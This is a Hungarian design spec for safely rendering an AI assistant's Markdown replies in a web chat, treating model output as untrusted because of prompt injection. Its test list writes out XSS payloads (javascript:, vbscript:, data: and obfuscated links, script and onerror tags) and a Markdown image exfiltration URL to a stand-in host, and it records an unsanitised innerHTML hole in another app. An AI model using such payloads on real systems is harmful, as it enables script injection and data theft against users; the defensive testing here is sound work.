# Markdown-megjelenítés az apps/web chatben — design spec

- **Dátum:** 2026-10-11
- **Ág:** `feat/web-chat-markdown` (a friss `main`-ről)
- **Hatókör:** csak `apps/web`. A `core`, a system prompt és a `customer-chat` nem változik.

## 1. Cél és sikerkritérium

Az asszisztens válaszai ma nyers Markdown-szövegként látszanak (pl. `**félkövér**` csillagokkal). A cél, hogy a válasz formázva jelenjen meg: félkövér, listák, táblázat, kód és linkek.

Sikeres, ha a következők mind teljesülnek:

- az asszisztens válasza formázva jelenik meg, a felhasználó saját üzenete pedig sima szöveg marad;
- streamelés közben nem villognak nyers, lezáratlan jelek (`**`, ```` ``` ````);
- a széles táblázat a buborékon belül vízszintesen görgethető, mobilon sem tolja szét az oldalt;
- a modell kimenete nem megbízható bemenetként van kezelve: XSS, veszélyes link vagy kép-alapú adatszivárgás nem lehetséges, és ezt automata tesztek bizonyítják.

## 2. Hatókörön kívül

Ezek nem részei ennek a PR-nak:

- **Rögzített beviteli sáv és okos auto-görgetés:** ugráló Stop gomb, „csak akkor kövesse a szöveget, ha a felhasználó alul van”, mobil billentyűzet. Ez külön PR lesz, saját spec-kel, a Markdown PR után.
- **Másolás gomb és kód-kiemelés (Shiki):** a felhasználó nem kérte.
- **A system prompt módosítása:** lásd a 9. pontot (Nyitott kérdések).
- **jsdom vagy Testing Library:** az SSR-tesztek elegendőek.

## 3. Megközelítés

A választott út a **react-markdown 10 + remark-gfm 4 + remend 1.4**.

| Csomag | Verzió (pontosan, `^` nélkül) | Szerep |
|---|---|---|
| `react-markdown` | `10.1.0` | Markdown → React-elemek, `dangerouslySetInnerHTML` nélkül |
| `remark-gfm` | `4.0.1` | GFM: táblázat, áthúzás, autolink, task-lista |
| `remend` | `1.4.0` | Félkész Markdown lezárása streamelés közben; nulla függőség |

**Elvetett alternatívák:**

- **Streamdown 2.7:** alapból tartalmazza a `rehype-raw`-t, vagyis nyers HTML-t enged. Ezt kézzel kellene eltávolítani, és egy frissítés csendben visszahozhatná. A stílusa Tailwind-alapú (az app CSS-modulokat használ), és behúzza a Shikit és a `marked`-ot is, amit nem kértünk.
- **Saját parser:** a táblázat és a lista szélső esetei miatt hibaforrás lenne.

**Telepítési feltételek:**

- egyik csomagnak sincs `install`/`postinstall` scriptje, ezért a `pnpm-workspace.yaml` `allowBuilds` nem változik;
- telepítés után ellenőrizni kell, hogy a pnpm nem jelez új, letiltott build-scriptet;
- a lockfile-ban a `remend` alatt nem lehet függőség.

## 4. Komponensek és adatfolyam

```
ChatPanel (status, messages)
  └─ MessageParts (message, escalatePrefix, isStreaming)
       ├─ user szöveg      → <p class="text">          (pre-wrap, változatlan)
       ├─ assistant szöveg → splitEscalation → AssistantMarkdown (text, isStreaming)
       └─ tool part        → ToolStep (változatlan)
```

### 4.1 `apps/web/src/chat/assistant-markdown.tsx` (új)

Props: `{ text: string; isStreaming: boolean }`.

- `isStreaming` igaz esetén `remend(text)`, egyébként a `text` változatlanul. **A kész üzenetre a remend nem fut.**
- `<Markdown>` a következő beállításokkal:
  - `remarkPlugins: [remarkGfm]`
  - `skipHtml`
  - `disallowedElements: ['img']`
  - `urlTransform: safeUrl`
  - saját `a` és `table` komponens
- A wrapper elem `className={styles.markdown}`.
- A komponens `React.memo`-val van becsomagolva: streamelés közben minden új darabnál az egész üzenetlista újrarenderel, de a korábbi üzenetek `text`/`isStreaming` propja (primitívek) nem változik, így azok Markdownját nem kell újra feldolgozni — csak a streamelő üzenetét.

### 4.2 `message-parts.tsx` (módosul)

- Új prop: `isStreaming: boolean`. Csak az üzenet **utolsó szöveges partja** kapja meg igaz értékként.
- Az asszisztens-ágban az eddigi `<p className={styles.text}>` helyére az `AssistantMarkdown` kerül. Az eszkalációs jelvény marad, a `splitEscalation` utáni maradék szöveg megy Markdownba.
- A user-ág változatlan.

### 4.3 `chat-panel.tsx` (módosul)

- `isStreaming = status === 'streaming' && message === az utolsó üzenet && message.role === 'assistant'`.
- Stop vagy hiba után a `status` már nem `streaming`. A megszakított válasz ezért a valódi, esetleg lezáratlan tartalmával jelenik meg, a remend nem módosítja.

## 5. Biztonsági szabályok

A modell válasza nem megbízható bemenet: prompt injectiont hordozhat egy tool-eredményből vagy egy tudásbázis-cikkből. Minden szabály az `assistant-markdown.tsx`-ben él, egy helyen.

1. **Nyers HTML:**
   - nincs `rehype-raw`, és be van kapcsolva a `skipHtml`;
   - a `<script>`, `<iframe>` és `<img onerror>` sem elemként, sem eseménykezelőként nem jelenik meg.
2. **Linkek, engedélylistával:** a `safeUrl` a már dekódolt URL-en fut.
   - Kizárólag a `/^(https?|mailto):/i` minta engedett.
   - Minden más üres stringet ad: `javascript:` bármilyen kis- és nagybetűvel, `vbscript:`, `data:`, a tabulátorral megbontott `java&#x09;script:`, a relatív és a protokoll-relatív (`//`) URL, valamint a remend félkész-link jelölője (`streamdown:incomplete-link`).
3. **Az `a` komponens:**
   - üres vagy elutasított `href` esetén csak a gyerekeit rendereli, `<a>` nélkül, így a szöveg látszik, de nem kattintható;
   - engedett `href` esetén mindig `target="_blank" rel="noopener noreferrer nofollow"`.
4. **Képek tiltva:**
   - az `img` letiltott elem, az alt-szöveg sem jelenik meg;
   - ok: a Markdown-kép adatszivárgási csatorna, mert a böngésző magától letölti az injektált URL-t.
5. **A felhasználó üzenete** sima szöveg marad, nem megy át Markdown-rendereren.

## 6. Stílus (`chat.module.css`)

**`.markdown`:**
- `white-space: normal` és `overflow-wrap: anywhere`. A `pre-wrap` a Markdown-elemek között plusz üres sorokat okozna. A user-üzenet `.text` osztálya `pre-wrap` marad.
- Az első gyerek felső és az utolsó gyerek alsó margója 0, hogy a buborék ne nőjön.
- Listák: kisebb behúzás.
- Inline `code` és `pre`: `var(--code-bg)`. A `pre` `overflow-x: auto`, `white-space: pre`.
- Táblázat: `border-collapse`, `var(--border)` keret, cellapadding. A fejléc `nowrap`.

**`.tableScroll`:** `overflow-x: auto` és `max-width: 100%`.

**`.assistant`:** `min-width: 0`, hogy a flex-elem ne nyúljon szét egy széles táblázattól.

Csak meglévő CSS-változók kerülnek felhasználásra, így a sötét mód automatikusan működik.

## 7. Tesztelés

A meglévő módszer marad: szerveroldali render (`renderToStaticMarkup`), node környezet, jsdom nélkül.

### 7.1 `assistant-markdown.spec.tsx` (új)

**Formázás:**
- félkövér → `<strong>`, lista → `<ul><li>`, kódblokk → `<pre><code>`;
- a GFM-táblázat a `tableScroll` wrapperben `<table>`-ként jelenik meg.

**Nyers HTML:** a `<script>`, `<iframe>` és `<img src=x onerror=…>` után a markupban nincs `<script`, `<iframe`, `onerror` és `<img`.

**Kép:** a `![x](https://evil.example/?d=titok)` után nincs `<img`, és nincs `evil.example`.

**Elutasított linkek.** A feltétel mindegyikre: nincs `<a`, de a link szövege látszik.
- `javascript:alert(1)`
- `JaVaScRiPt:alert(1)`
- `vbscript:msgbox(1)`
- `data:text/html,<script>…`
- `java&#x09;script:alert(1)`
- hivatkozás-stílusú link: `[x][r]` + `[r]: javascript:alert(1)`
- protokoll-relatív: `//evil.example`

**Engedett linkek.** A feltétel mindegyikre: `<a href>` + `target="_blank"` + `rel="noopener noreferrer nofollow"`.
- `https://pelda.hu`
- `mailto:info@pelda.hu`
- GFM autolink: `www.pelda.hu` és a csupasz `https://pelda.hu` a szövegben

**Remend:**
- `isStreaming=true`:
  - a „ár: **nyitott” → `<strong>`;
  - a lezáratlan ```` ``` ```` → `<pre>`;
  - a félkész link → szöveg, nincs `<a`.
- **`isStreaming=false`:** ugyanaz a „ár: **nyitott” szöveg változatlan marad, a nyers `**` látszik, `<strong>` nincs.

### 7.2 `message-parts.spec.tsx` (bővül)

- A user `**x**` üzenete `<p class="…text…">`, `<strong>` nélkül.
- Az asszisztens szövege a `.markdown` wrapperben van, nem a `.text` osztállyal. Ez a white-space-szabály automata fele.
- Csak az utolsó szöveges part kapja meg az `isStreaming=true` értéket.
- Az eszkalációs jelvény a Markdown mellett is megjelenik.

### 7.3 `chat-panel.spec.tsx` (bővül)

`streaming` státusznál csak az utolsó asszisztens-üzenet streamel.

- Teszt: a korábbi asszisztens-üzenetben egy „**nyitott” szöveg nyers marad.
- Teszt: az utolsóban `<strong>` lesz.

### 7.4 Kézi próba

Parancs: `pnpm nx dev web`, a :3001 porton. Desktop és keskeny, mobil szélességű nézetben is.

1. **Összehasonlító kérdés** („Hasonlítsd össze a 3 legolcsóbb kaktuszt”): a táblázat megjelenik, és keskeny nézetben a buborékon belül görgethető.
2. **Tulajdonságlistát kérő kérdés** („Sorold fel a Monstera deliciosa gondozási tulajdonságait”): ez a szimpla sortörés esete. Ha a sorok összefolynak, az a 9. pont 1–2. kérdését aktiválja.
3. **Térközök:** a Markdown-elemek között nincs plusz üres sor (`white-space: normal`). A beviteli mező (`<input>`) egysoros, így többsoros user-üzenet a felületen nem küldhető; a user-üzenet `pre-wrap` megjelenítését (sortörések megtartása) a 7.2 automata tesztje fedi.
4. **Streamelés közben** nem villognak nyers `**` vagy ```` ``` ```` jelek.
5. **Stop gomb** streamelés közben: a félbehagyott válasz rendben, összeomlás nélkül jelenik meg.
6. **Linkek:** egy link a válaszban új lapon nyílik, a `rel` értékét a DevTools mutatja.

## 8. Commitok

1. `docs: add the web chat markdown design spec`: ez a fájl.
2. `build(web): add react-markdown, remark-gfm and remend at exact versions`: `package.json` és lockfile, plusz a 3. pont telepítési ellenőrzései.
3. `feat(web): render assistant answers as safe Markdown`:
   - `assistant-markdown.tsx` és a specje, kezdetben remend nélkül;
   - a CSS;
   - a `message-parts.tsx` bekötése;
   - a `message-parts` spec bővítése.
4. `feat(web): close unfinished Markdown while an answer streams`:
   - remend;
   - az `isStreaming` átvezetése `ChatPanel` → `MessageParts` → `AssistantMarkdown`;
   - a remend- és a `chat-panel` tesztek.
5. `docs: describe Markdown rendering in CLAUDE.md`: az `apps/web` leírásába a biztonsági szabályok röviden.

**Ellenőrzés a végén:**
- `pnpm nx run-many -t lint,typecheck,test -p core web cli`;
- `pnpm nx build web` (csak az ismert, korábbi webpack-figyelmeztetés megengedett);
- kézi próba a 7.4 szerint.

A push, a PR-nyitás és a merge csak kifejezett jóváhagyás után történik.

## 9. Nyitott kérdések (nincs döntés)

1. **Formázási utasítás a modellnek.**
   - A `docs/system-prompt.md` ma semmilyen formázást nem kér. Ebben a PR-ban **nem módosul**.
   - Ha a kézi próbán kiderül, hogy kell utasítás (pl. a listák szimpla sortöréssel folynak össze), a lehetséges irány egy **web-specifikus kiegészítés a `streamAskAgent` webes belépési pontján**, a megosztott prompt érintése nélkül. Így a CLI nyers kimenete és a customer-chat nem változik.
   - Hogy ez hogyan épüljön be (opció vagy külön prompt-blokk, és hogyan maradjon szinkronban a doksival), azt külön kell eldönteni.
   - Egy lehetséges XML-tagelt szöveg, csak kiindulópontként:
     ```xml
     <formatting>
     - A válaszod Markdownként jelenik meg: használj **félkövért** a terméknevekhez, felsorolást (minden elem külön sorban, "- " jellel) a tulajdonságokhoz.
     - Több termék összehasonlításához rövid táblázatot is írhatsz (legfeljebb 5 sor), de ne dumpold a teljes lekérdezés-eredményt.
     - A bekezdések közé tegyél üres sort; ne tördelj szimpla sortöréssel.
     - Ne írj HTML-t, és ne illessz be képet.
     </formatting>
     ```
2. **`remark-breaks`.** Csak akkor kerül be, ha a 7.4 kézi próba 2. pontján a probléma ténylegesen előjön. Ez egy negyedik, pontosan rögzített függőség lenne.

## 10. Ismert, nem érintett

- **A customer-chat XSS-kockázata.**
  - Az `apps/customer-chat/chat.html:164` a modell válaszát `el.innerHTML = marked.parse(text)`-tel írja ki, sanitizálás nélkül. Prompt injectionnel ez XSS-t tesz lehetővé.
  - A customer-chat leadott házi feladat, ezért ebben a PR-ban (és szabály szerint általában sem) nem módosítjuk.
  - **Éles használat előtt javítani kell:** sanitizálás (pl. DOMPurify), vagy a nyers HTML tiltása a `marked`-ban.
